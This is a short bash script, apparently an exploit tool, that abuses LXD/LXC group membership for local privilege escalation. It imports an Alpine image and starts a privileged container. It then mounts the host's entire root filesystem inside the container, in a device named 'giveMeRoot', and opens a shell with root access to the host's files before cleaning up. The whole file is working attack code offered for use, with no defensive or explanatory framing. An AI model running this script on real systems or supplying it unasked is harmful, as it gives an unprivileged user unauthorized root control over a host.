function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
